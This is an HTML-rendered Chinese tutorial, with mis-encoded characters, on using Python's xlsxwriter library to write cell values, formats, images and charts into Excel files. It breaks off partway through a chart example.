<h2 id="å•å…ƒæ ¼å¡«å€¼"><a href="#å•å…ƒæ ¼å¡«å€¼" class="headerlink" title="å•å…ƒæ ¼å¡«å€¼"></a>å•å…ƒæ ¼å¡«å€¼</h2><h3 id="å•ä¸ªå•å…ƒæ ¼"><a href="#å•ä¸ªå•å…ƒæ ¼" class="headerlink" title="å•ä¸ªå•å…ƒæ ¼"></a>å•ä¸ªå•å…ƒæ ¼</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=gbk</span></span><br><span class="line"><span class="keyword">import</span> xlsxwriter</span><br><span class="line"> </span><br><span class="line"><span class="comment"># ä¸€ï¼šåˆ›å»ºå·¥ä½œç°¿</span></span><br><span class="line">workbook = xlsxwriter.Workbook(<span class="string">&#x27;test.xlsx&#x27;</span>)<span class="comment">#åˆ›å»ºä¸€ä¸ªexcelæ–‡ä»¶</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># äºŒï¼šåˆ›å»ºå·¥ä½œè¡¨</span></span><br><span class="line">worksheet1 = workbook.add_worksheet(<span class="string">&#x27;test-sheet1&#x27;</span>)<span class="comment">#åœ¨æ–‡ä»¶ä¸­åˆ›å»ºä¸€ä¸ªåä¸ºtest-sheet1çš„sheet,ä¸åŠ åå­—é»˜è®¤ä¸ºsheet1</span></span><br><span class="line">worksheet2 = workbook.add_worksheet()   <span class="comment">#  Sheet2</span></span><br><span class="line">worksheet3 = workbook.add_worksheet(<span class="string">&#x27;test-sheet2&#x27;</span>)</span><br><span class="line">worksheet4 = workbook.add_worksheet()  <span class="comment">#  Sheet4</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># ä¸‰ï¼šè®¾ç½®å•å…ƒæ ¼çš„å€¼</span></span><br><span class="line">worksheet1.write(<span class="string">&#x27;A1&#x27;</span>, <span class="string">&#x27;hello123&#x27;</span>)  <span class="comment"># åœ¨A1å•å…ƒæ ¼å†™ä¸ŠHELLO</span></span><br><span class="line">worksheet1.write(<span class="string">&#x27;A2&#x27;</span>, <span class="string">&#x27;123æµ‹è¯•456&#x27;</span>)  <span class="comment"># åœ¨B2ä¸Šå†™ä¸Šä¸­æ–‡åŠ ç²—</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># ä½¿ç”¨è¡Œåˆ—æ–¹å¼,ä¸‹æ ‡ä»0å¼€å§‹</span></span><br><span class="line">worksheet1.write(<span class="number">2</span>, <span class="number">0</span>, <span class="number">100</span>) <span class="comment">#  ç¬¬3è¡Œç¬¬1åˆ—ï¼ˆå³A3ï¼‰ å†™å…¥100</span></span><br><span class="line">worksheet1.write(<span class="number">3</span>, <span class="number">0</span>, <span class="number">99.8</span>)  <span class="comment">#  ç¬¬4è¡Œç¬¬1åˆ—ï¼ˆå³A4ï¼‰ å†™å…¥99.8</span></span><br><span class="line">worksheet1.write(<span class="number">4</span>, <span class="number">0</span>, <span class="string">&#x27;=SUM(A3:A4)&#x27;</span>)  <span class="comment"># å†™ä¸Šexcelå…¬å¼</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># åˆå¹¶å•å…ƒæ ¼</span></span><br><span class="line">worksheet1.merge_range(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="string">&#x27;åˆå¹¶01&#x27;</span>)</span><br><span class="line">worksheet1.merge_range(<span class="string">&#x27;C6:E7&#x27;</span>,<span class="string">&#x27;åˆå¹¶02&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># worksheet1.write_numberï¼šå†™å…¥æ•°å­—</span></span><br><span class="line">worksheet1.write_number(<span class="number">5</span>, <span class="number">0</span>, <span class="number">1001</span>)  <span class="comment">#   Int or float</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># worksheet1.write_blankï¼šå†™å…¥ç©ºæ ¼</span></span><br><span class="line">worksheet1.write_blank(<span class="number">6</span>, <span class="number">0</span>,<span class="string">&#x27;xx&#x27;</span>)  <span class="comment"># ä¸ç®¡ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä»€ä¹ˆï¼Œéƒ½å†™å…¥ç©ºæ ¼</span></span><br><span class="line"><span class="comment"># worksheet1.write_formulaï¼šå†™å…¥å…¬å¼</span></span><br><span class="line">worksheet1.write_formula(<span class="number">7</span>, <span class="number">0</span>, <span class="string">&#x27;=SUM(A3:A4)&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># worksheet1.write_datetimeï¼šå†™å…¥æ—¶é—´æ ¼å¼</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line">date_format = workbook.add_format(&#123;<span class="string">&#x27;num_format&#x27;</span>: <span class="string">&#x27;yyyy-mm-dd H:M:S&#x27;</span>&#125;)</span><br><span class="line">worksheet1.write_datetime(<span class="number">8</span>, <span class="number">0</span>, datetime.today(),date_format )</span><br><span class="line"> </span><br><span class="line"><span class="comment"># worksheet1.write_boolean:å†™å…¥é€»è¾‘æ•°æ®</span></span><br><span class="line">worksheet1.write_boolean(<span class="number">9</span>, <span class="number">0</span>,<span class="literal">False</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># worksheet1.write_url:å†™å…¥é“¾æ¥åœ°å€</span></span><br><span class="line">worksheet1.write_url(<span class="number">10</span>, <span class="number">0</span>,<span class="string">&#x27;www.baidu.com&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">workbook.close()</span><br></pre></td></tr></table></figure>

<h3 id="å¤šä¸ªå•å…ƒæ ¼"><a href="#å¤šä¸ªå•å…ƒæ ¼" class="headerlink" title="å¤šä¸ªå•å…ƒæ ¼"></a>å¤šä¸ªå•å…ƒæ ¼</h3><blockquote>
<p>ä»¥<strong>åˆ—è¡¨</strong>å½¢å¼è¿›è¡Œæ•°å€¼å¡«å…¥ã€‚<br>åªè¦å¡«å……ä½ç½®ä»¥åŠå¡«å……æ•°å€¼è¶³å¤Ÿæ¸…æ™°å°±å¯ä»¥å®Œæˆç›¸å…³æ•°å€¼çš„å†™å…¥ã€‚</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=gbk</span></span><br><span class="line"><span class="keyword">import</span> xlsxwriter</span><br><span class="line"> </span><br><span class="line"><span class="comment"># ä¸€ï¼šåˆ›å»ºå·¥ä½œç°¿</span></span><br><span class="line">workbook = xlsxwriter.Workbook(<span class="string">&#x27;test.xlsx&#x27;</span>)<span class="comment">#åˆ›å»ºä¸€ä¸ªexcelæ–‡ä»¶</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># äºŒï¼šåˆ›å»ºå·¥ä½œè¡¨</span></span><br><span class="line">worksheet1 = workbook.add_worksheet(<span class="string">&#x27;test-sheet1&#x27;</span>)<span class="comment">#åœ¨æ–‡ä»¶ä¸­åˆ›å»ºä¸€ä¸ªåä¸ºtest-sheet1çš„sheet,ä¸åŠ åå­—é»˜è®¤ä¸ºsheet1</span></span><br><span class="line"><span class="comment"># worksheet2 = workbook.add_worksheet()   #  Sheet2</span></span><br><span class="line"><span class="comment"># worksheet3 = workbook.add_worksheet(&#x27;test-sheet2&#x27;)</span></span><br><span class="line"><span class="comment"># worksheet4 = workbook.add_worksheet()  #  Sheet4</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># # write_row å†™å…¥</span></span><br><span class="line">lst=[<span class="string">&#x27;12&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;56&#x27;</span>,<span class="string">&#x27;78&#x27;</span>]</span><br><span class="line">worksheet1.write_row(<span class="number">5</span>, <span class="number">0</span>, lst)  <span class="comment"># æŠŠæ•°æ®å†™åˆ°ç¬¬6è¡Œçš„ï¼Œä»ç¬¬1åˆ—å¼€å§‹åˆ°ç¬¬4åˆ—ä¸Š</span></span><br><span class="line"><span class="comment"># # write_column å†™å…¥</span></span><br><span class="line">worksheet1.write_column(<span class="number">6</span>, <span class="number">0</span>,lst) <span class="comment"># æŠŠæ•°æ®å†™åˆ°ç¬¬1åˆ—ï¼Œä»ç¬¬7è¡Œå¼€å§‹åˆ°ç¬¬10è¡Œä¸Š</span></span><br><span class="line"> </span><br><span class="line">workbook.close()</span><br></pre></td></tr></table></figure>

<h2 id="è®¾ç½®æ ¼å¼"><a href="#è®¾ç½®æ ¼å¼" class="headerlink" title="è®¾ç½®æ ¼å¼"></a>è®¾ç½®æ ¼å¼</h2><h3 id="è®¾ç½®å•å…ƒæ ¼æ ·å¼"><a href="#è®¾ç½®å•å…ƒæ ¼æ ·å¼" class="headerlink" title="è®¾ç½®å•å…ƒæ ¼æ ·å¼"></a>è®¾ç½®å•å…ƒæ ¼æ ·å¼</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=gbk</span></span><br><span class="line"><span class="keyword">import</span> xlsxwriter</span><br><span class="line"> </span><br><span class="line"><span class="comment"># ä¸€ï¼šåˆ›å»ºå·¥ä½œç°¿</span></span><br><span class="line">workbook = xlsxwriter.Workbook(<span class="string">&#x27;test.xlsx&#x27;</span>)<span class="comment">#åˆ›å»ºä¸€ä¸ªexcelæ–‡ä»¶</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># äºŒï¼šåˆ›å»ºå·¥ä½œè¡¨</span></span><br><span class="line">worksheet1 = workbook.add_worksheet(<span class="string">&#x27;test-sheet1&#x27;</span>)<span class="comment">#åœ¨æ–‡ä»¶ä¸­åˆ›å»ºä¸€ä¸ªåä¸ºtest-sheet1çš„sheet,ä¸åŠ åå­—é»˜è®¤ä¸ºsheet1</span></span><br><span class="line"><span class="comment"># worksheet2 = workbook.add_worksheet()   #  Sheet2</span></span><br><span class="line"><span class="comment"># worksheet3 = workbook.add_worksheet(&#x27;test-sheet2&#x27;)</span></span><br><span class="line"><span class="comment"># worksheet4 = workbook.add_worksheet()  #  Sheet4</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># å¤§éƒ¨åˆ†æ ·å¼å¦‚ä¸‹ï¼š</span></span><br><span class="line"><span class="built_in">format</span> = &#123;</span><br><span class="line">    <span class="string">&#x27;font_size&#x27;</span>: <span class="number">10</span>,  <span class="comment"># å­—ä½“å¤§å°</span></span><br><span class="line">    <span class="string">&#x27;bold&#x27;</span>: <span class="literal">True</span>,  <span class="comment"># æ˜¯å¦ç²—ä½“</span></span><br><span class="line">    <span class="comment"># &#x27;bg_color&#x27;: &#x27;#101010&#x27;,  # è¡¨æ ¼èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">    <span class="string">&#x27;fg_color&#x27;</span>: <span class="string">&#x27;#00FF00&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;font_color&#x27;</span>: <span class="string">&#x27;#0000FF&#x27;</span>,  <span class="comment"># å­—ä½“é¢œè‰²</span></span><br><span class="line">    <span class="string">&#x27;align&#x27;</span>: <span class="string">&#x27;center&#x27;</span>,  <span class="comment"># æ°´å¹³å±…ä¸­å¯¹é½</span></span><br><span class="line">    <span class="string">&#x27;valign&#x27;</span>: <span class="string">&#x27;vcenter&#x27;</span>,  <span class="comment"># å‚ç›´å±…ä¸­å¯¹é½</span></span><br><span class="line">    <span class="comment"># &#x27;num_format&#x27;: &#x27;yyyy-mm-dd H:M:S&#x27;,# è®¾ç½®æ—¥æœŸæ ¼å¼</span></span><br><span class="line">    <span class="comment"># åé¢å‚æ•°æ˜¯çº¿æ¡å®½åº¦</span></span><br><span class="line">    <span class="string">&#x27;border&#x27;</span>: <span class="number">1</span>, <span class="comment"># è¾¹æ¡†å®½åº¦</span></span><br><span class="line">    <span class="string">&#x27;top&#x27;</span>: <span class="number">1</span>,  <span class="comment"># ä¸Šè¾¹æ¡†</span></span><br><span class="line">    <span class="string">&#x27;left&#x27;</span>: <span class="number">1</span>,  <span class="comment"># å·¦è¾¹æ¡†</span></span><br><span class="line">    <span class="string">&#x27;right&#x27;</span>: <span class="number">1</span>,  <span class="comment"># å³è¾¹æ¡†</span></span><br><span class="line">    <span class="string">&#x27;bottom&#x27;</span>: <span class="number">1</span>  <span class="comment"># åº•è¾¹æ¡†</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">style = workbook.add_format(<span class="built_in">format</span>)   <span class="comment"># è®¾ç½®æ ·å¼formatæ˜¯ä¸€ä¸ªå­—å…¸</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># # write_row å†™å…¥</span></span><br><span class="line">lst=[<span class="string">&#x27;12&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;56&#x27;</span>,<span class="string">&#x27;78&#x27;</span>]</span><br><span class="line">worksheet1.write_row(<span class="number">5</span>, <span class="number">0</span>, lst,style)  <span class="comment"># æŠŠæ•°æ®å†™åˆ°ç¬¬6è¡Œçš„ï¼Œä»ç¬¬1åˆ—å¼€å§‹åˆ°ç¬¬4åˆ—ä¸Š</span></span><br><span class="line"><span class="comment"># # write_column å†™å…¥</span></span><br><span class="line">worksheet1.write_column(<span class="number">6</span>, <span class="number">0</span>,lst) <span class="comment"># æŠŠæ•°æ®å†™åˆ°ç¬¬1åˆ—ï¼Œä»ç¬¬7è¡Œå¼€å§‹åˆ°ç¬¬10è¡Œä¸Š</span></span><br><span class="line">worksheet1.write(<span class="string">&#x27;A1&#x27;</span>,<span class="number">200</span>,style)</span><br><span class="line">worksheet1.write(<span class="number">2</span>,<span class="number">0</span>,<span class="number">900</span>,style)</span><br><span class="line">workbook.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="è®¾ç½®å•å…ƒæ ¼è¡Œé«˜ã€åˆ—å®½"><a href="#è®¾ç½®å•å…ƒæ ¼è¡Œé«˜ã€åˆ—å®½" class="headerlink" title="è®¾ç½®å•å…ƒæ ¼è¡Œé«˜ã€åˆ—å®½"></a>è®¾ç½®å•å…ƒæ ¼è¡Œé«˜ã€åˆ—å®½</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=gbk</span></span><br><span class="line"><span class="keyword">import</span> xlsxwriter</span><br><span class="line"> </span><br><span class="line"><span class="comment"># ä¸€ï¼šåˆ›å»ºå·¥ä½œç°¿</span></span><br><span class="line">workbook = xlsxwriter.Workbook(<span class="string">&#x27;test.xlsx&#x27;</span>)<span class="comment">#åˆ›å»ºä¸€ä¸ªexcelæ–‡ä»¶</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># äºŒï¼šåˆ›å»ºå·¥ä½œè¡¨</span></span><br><span class="line">worksheet1 = workbook.add_worksheet(<span class="string">&#x27;test-sheet1&#x27;</span>)<span class="comment">#åœ¨æ–‡ä»¶ä¸­åˆ›å»ºä¸€ä¸ªåä¸ºtest-sheet1çš„sheet,ä¸åŠ åå­—é»˜è®¤ä¸ºsheet1</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># è®¾ç½®è¡Œå®½</span></span><br><span class="line">worksheet1.set_row(<span class="number">0</span>,<span class="number">60</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># è®¾ç½®åˆ—å®½</span></span><br><span class="line">worksheet1.set_column(<span class="number">1</span>,<span class="number">2</span>,<span class="number">30</span>)</span><br><span class="line">worksheet1.set_column(<span class="string">&#x27;D:F&#x27;</span>,<span class="number">40</span>)</span><br><span class="line">workbook.close()</span><br></pre></td></tr></table></figure>

<h3 id="è®¾ç½®æ ‡ç­¾é¢œè‰²"><a href="#è®¾ç½®æ ‡ç­¾é¢œè‰²" class="headerlink" title="è®¾ç½®æ ‡ç­¾é¢œè‰²"></a>è®¾ç½®æ ‡ç­¾é¢œè‰²</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">worksheet1.set_tab_color(<span class="string">&#x27;#0000FF&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="æ’å…¥å›¾ç‰‡"><a href="#æ’å…¥å›¾ç‰‡" class="headerlink" title="æ’å…¥å›¾ç‰‡"></a>æ’å…¥å›¾ç‰‡</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=gbk</span></span><br><span class="line"><span class="keyword">import</span> xlsxwriter</span><br><span class="line"> </span><br><span class="line"><span class="comment"># ä¸€ï¼šåˆ›å»ºå·¥ä½œç°¿</span></span><br><span class="line">workbook = xlsxwriter.Workbook(<span class="string">&#x27;test.xlsx&#x27;</span>)<span class="comment">#åˆ›å»ºä¸€ä¸ªexcelæ–‡ä»¶</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># äºŒï¼šåˆ›å»ºå·¥ä½œè¡¨</span></span><br><span class="line">worksheet1 = workbook.add_worksheet(<span class="string">&#x27;test-sheet1&#x27;</span>)<span class="comment">#åœ¨æ–‡ä»¶ä¸­åˆ›å»ºä¸€ä¸ªåä¸ºtest-sheet1çš„sheet,ä¸åŠ åå­—é»˜è®¤ä¸ºsheet1</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># # è®¾ç½®è¡Œå®½</span></span><br><span class="line"><span class="comment"># worksheet1.set_row(0,60)</span></span><br><span class="line"><span class="comment"># # è®¾ç½®åˆ—å®½</span></span><br><span class="line"><span class="comment"># worksheet1.set_column(1,2,30)</span></span><br><span class="line"><span class="comment"># worksheet1.set_column(&#x27;D:F&#x27;,40)</span></span><br><span class="line"><span class="comment"># worksheet1.set_tab_color(&#x27;#0000FF&#x27;)</span></span><br><span class="line"> </span><br><span class="line">worksheet1.insert_image(<span class="string">&#x27;A3&#x27;</span>, <span class="string">&#x27;00.jpg&#x27;</span>, &#123;<span class="string">&#x27;url&#x27;</span>: <span class="string">&#x27;https://blog.csdn.net/&#x27;</span>&#125;)</span><br><span class="line">workbook.close()</span><br></pre></td></tr></table></figure>

<h1 id="æ’å…¥å›¾è¡¨"><a href="#æ’å…¥å›¾è¡¨" class="headerlink" title="æ’å…¥å›¾è¡¨"></a>æ’å…¥å›¾è¡¨</h1><blockquote>
<p>chartç±»å®å›¾è¡¨ç»„ä»¶ï¼Œæ”¯æŒåŒ…æ‹¬é¢ç§¯ã€æ¡å½¢å›¾ã€æŸ±çŠ¶å›¾ã€æŠ˜çº¿å›¾ã€æ•£ç‚¹å›¾ç­‰ï¼Œä¸€ä¸ªå›¾è¡¨å¯¹è±¡æ˜¯é€šè¿‡Workbookçš„add_chartæ–¹æ³•åˆ›å»ºï¼Œé€šè¿‡<code>&#123;type, &#39;å›¾è¡¨ç±»å‹&#39;&#125;</code>å­—å…¸æ¥åˆ¶å®šå›¾è¡¨ç±»å‹,å¸¸è§çš„å›¾è¡¨æ ·å¼å¦‚ä¸‹ï¼š</p>
<ul>
<li>areaï¼šé¢ç§¯æ ·å¼çš„å›¾è¡¨</li>
<li>barï¼šæ¡å½¢å›¾</li>
<li>columnï¼šæŸ±çŠ¶å›¾</li>
<li>lineï¼šçº¿æ¡æ ·å¼çš„å›¾è¡¨</li>
<li>pieï¼šé¥¼å½¢å›¾</li>
<li>scatterï¼šæ•£ç‚¹å›¾</li>
<li>stockï¼šè‚¡ç¥¨æ ·å¼çš„å›¾è¡¨</li>
<li>radarï¼šé›·è¾¾æ ·å¼çš„å›¾è¡¨</li>
</ul>
</blockquote>
<h2 id="åˆ›å»ºchartç±»"><a href="#åˆ›å»ºchartç±»" class="headerlink" title="åˆ›å»ºchartç±»"></a>åˆ›å»ºchartç±»</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1:åˆ›å»ºchartå¯¹è±¡</span></span><br><span class="line">chart = workbook.add_chart(&#123;<span class="string">&#x27;type&#x27;</span>:<span class="string">&#x27;line&#x27;</span>&#125;)</span><br><span class="line"><span class="comment"># 2ï¼šè®¾ç½®chartå¯¹è±¡ç›¸å…³æ•°æ®ï¼Œå±æ€§</span></span><br><span class="line"><span class="comment"># 3ï¼šç„¶åé€šè¿‡Worksheetçš„insert_chart()æ–¹æ³•æ’å…¥åˆ°æŒ‡å®šä½ç½®</span></span><br><span class="line">worksheet1.insert_chart(<span class="string">&#x27;A3&#x27;</span>,chart,&#123;<span class="string">&#x27;x_offset&#x27;</span>:<span class="number">25</span>,<span class="string">&#x27;y_offset&#x27;</span>:<span class="number">10</span>&#125;)   <span class="comment">#æ”¾ç½®å›¾è¡¨ä½ç½®</span></span><br></pre></td></tr></table></figure>

<h2 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h2><h3 id="æ·»åŠ æ•°æ®"><a href="#æ·»åŠ æ•°æ®" class="headerlink" title="æ·»åŠ æ•°æ®"></a>æ·»åŠ æ•°æ®</h3><blockquote>
<p>ä»¥å­—å…¸ç±»å‹æ·»åŠ æ•°æ®ã€‚</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chart.add_series(&#123;</span><br><span class="line">     <span class="string">&#x27;categories&#x27;</span>: <span class="string">&#x27;=Sheet1!$A$1:$A$5&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;values&#x27;</span>: <span class="string">&#x27;=Sheet1!$B$1:$B$5&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;line&#x27;</span>: &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;red&#x27;</span>&#125;,</span><br><span class="line"> &#125;) </span><br></pre></td></tr></table></figure>


<h3 id="è®¾ç½®xè½´ä»¥åŠyè½´"><a href="#è®¾ç½®xè½´ä»¥åŠyè½´" class="headerlink" title="è®¾ç½®xè½´ä»¥åŠyè½´"></a>è®¾ç½®xè½´ä»¥åŠyè½´</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chart.set_x_axis(&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;x name&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;name_font&#x27;</span>: &#123;<span class="string">&#x27;size&#x27;</span>: <span class="number">14</span>, <span class="string">&#x27;bold&#x27;</span>: <span class="literal">True</span>&#125; ,</span><br><span class="line">                  <span class="string">&#x27;num_font&#x27;</span>: &#123;<span class="string">&#x27;italic&#x27;</span>: <span class="literal">True</span>&#125;</span><br><span class="line">                  &#125;)</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">nameï¼šè®¾ç½®xè½´åç§°ï¼›</span></span><br><span class="line"><span class="string">name_fontï¼šè®¾ç½®xè½´å­—ä½“ï¼›</span></span><br><span class="line"><span class="string">num_fontï¼šè®¾ç½®xè½´æ•°å­—å­—ä½“å±æ€§ï¼›</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="å…¶ä»–æ–¹æ³•"><a href="#å…¶ä»–æ–¹æ³•" class="headerlink" title="å…¶ä»–æ–¹æ³•"></a>å…¶ä»–æ–¹æ³•</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># set_size(options)æ–¹æ³•ï¼Œç”¨äºè®¾ç½®å›¾è¡¨å¤§å°ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</span></span><br><span class="line">chart.set_size(&#123;<span class="string">&#x27;width&#x27;</span>: <span class="number">720</span>, <span class="string">&#x27;height&#x27;</span>: <span class="number">576</span>&#125;)</span><br><span class="line"><span class="comment"># widthï¼šè®¾ç½®å®½åº¦ï¼›</span></span><br><span class="line"><span class="comment"># heightï¼šè®¾ç½®é«˜åº¦ï¼›</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># set_title(options)æ–¹æ³•ï¼Œè®¾ç½®å›¾è¡¨æ ‡é¢˜ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</span></span><br><span class="line">chart.set_title(&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;test&#x27;</span>&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># set_style(style_id)æ–¹æ³•ï¼Œç”¨äºè®¾ç½®å›¾è¡¨æ ·å¼ï¼Œstyle_idä¸ºä¸åŒæ•°å­—ä»£è¡¨ä¸åŒæ ·å¼</span></span><br><span class="line">chart.set_style(<span class="number">37</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># set_table(options)æ–¹æ³•ï¼Œè®¾ç½®xè½´ä¸ºæ•°æ®è¡¨æ ¼å¼ã€‚</span></span><br><span class="line">chart.set_table()</span><br></pre></td></tr></table></figure>

<h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=gbk</span></span><br><span class="line"><span class="keyword">import</span> xlsxwriter</span><br><span class="line"> </span><br><span class="line"><span class="comment"># ä¸€ï¼šåˆ›å»ºå·¥ä½œç°¿</span></span><br><span class="line">workbook = xlsxwriter.Workbook(<span class="string">&#x27;test.xlsx&#x27;</span>)<span class="comment">#åˆ›å»ºä¸€ä¸ªexcelæ–‡ä»¶</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># äºŒï¼šåˆ›å»ºå·¥ä½œè¡¨</span></span><br><span class="line">worksheet1 = workbook.add_worksheet(<span class="string">&#x27;test-sheet1&#x27;</span>)<span class="comment">#åœ¨æ–‡ä»¶ä¸­åˆ›å»ºä¸€ä¸ªåä¸ºtest-sheet1çš„sheet,ä¸åŠ åå­—é»˜è®¤ä¸ºsheet1</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># ä¸‰ï¼šæ•°æ®å‡†å¤‡</span></span><br><span class="line">row_data=[<span class="string">&#x27;å§“å&#x27;</span>,<span class="string">&#x27;æ•°å­¦&#x27;</span>,<span class="string">&#x27;è‹±è¯­&#x27;</span>,<span class="string">&#x27;è¯­æ–‡&#x27;</span>]</span><br><span class="line">col_data = [</span><br><span class="line">    [<span class="string">&#x27;å¼ ä¸‰&#x27;</span>,<span class="string">&#x27;æå››&#x27;</span>,<span class="string">&#x27;è€ç‹&#x27;</span>,<span class="string">&#x27;å¾·å&#x27;</span>,<span class="string">&#x27;èµµå››&#x27;</span>],</span><br><span class="line">    [<span class="number">90</span>, <span class="number">85</span>, <span class="number">120</span>, <span class="number">130</span>, <span class="number">99</span>],</span><br><span class="line">    [<span class="number">70</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">109</span>, <span class="number">110</span>],</span><br><span class="line">    [<span class="number">60</span>, <span class="number">95</span>, <span class="number">130</span>, <span class="number">120</span>, <span class="number">79</span>]</span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line">worksheet1.write_row(<span class="string">&#x27;A1&#x27;</span>,row_data)</span><br><span class="line">worksheet1.write_column(<span class="string">&#x27;A2&#x27;</span>,col_data[<span class="number">0</span>])</span><br><span class="line">worksheet1.write_column(<span class="string">&#x27;B2&#x27;</span>,col_data[<span class="number">1</span>])</span><br><span class="line">worksheet1.write_column(<span class="string">&#x27;C2&#x27;</span>,col_data[<span class="number">2</span>])</span><br><span class="line">worksheet1.write_column(<span class="string">&#x27;D2&#x27;</span>,col_data[<span class="number">3</span>])</span><br><span class="line"> </span><br><span class="line"><span class="comment"># å››ï¼šåˆ›å»ºchartå¯¹è±¡</span></span><br><span class="line">chart = workbook.add_chart(&#123;<span class="string">&#x27;type&#x27;</span>:<span class="string">&#x27;line&#x27;</span>&#125;)        <span class="comment"># çº¿æ¡æ ·å¼çš„å›¾è¡¨</span></span><br><span class="line"><span class="comment"># chart = workbook.add_chart(&#123;&#x27;type&#x27;:&#x27;column&#x27;&#125;)      # æŸ±çŠ¶å›¾</span></span><br><span class="line"><span class="comment"># chart = workbook.add_chart(&#123;&#x27;type&#x27;:&#x27;area&#x27;&#125;)       # é¢ç§¯æ ·å¼çš„å›¾è¡¨</span></span><br><span class="line"><span class="comment"># chart = workbook.add_chart(&#123;&#x27;type&#x27;:&#x27;stock&#x27;&#125;)      # è‚¡ç¥¨æ ·å¼çš„å›¾è¡¨</span></span><br><span class="line"><span class="comment"># chart = workbook.add_chart(&#123;&#x27;type&#x27;:&#x27;bar&#x27;&#125;)        # æ¡å½¢å›¾</span></span><br><span class="line"><span class="comment"># chart = workbook.add_chart(&#123;&#x27;type&#x27;:&#x27;pie&#x27;&#125;)        # é¥¼å½¢å›¾</span></span><br><span class="line"><span class="comment"># chart = workbook.add_chart(&#123;&#x27;type&#x27;:&#x27;scatter&#x27;&#125;)    # æ•£ç‚¹å›¾</span></span><br><span class="line"><span class="comment"># chart = workbook.add_chart(&#123;&#x27;type&#x27;:&#x27;radar&#x27;&#125;)      # é›·è¾¾æ ·å¼çš„å›¾è¡¨</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">chart.add_series(&#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;=test-sheet1!$B$1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;categories&#x27;</span>: <span class="string">&#x27;=test-sheet1!$A$2:$A$6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;values&#x27;</span>: <span class="string">&#x27;=test-sheet1!$B$2:$B$6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;line&#x27;</span>: &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;red&#x27;</span>&#125;,</span><br><span class="line">    <span class="string">&#x27;pie&#x27;</span>: &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;red&#x27;</span>&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line">chart.add_series(&#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;=test-sheet1!$C$1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;categories&#x27;</span>: 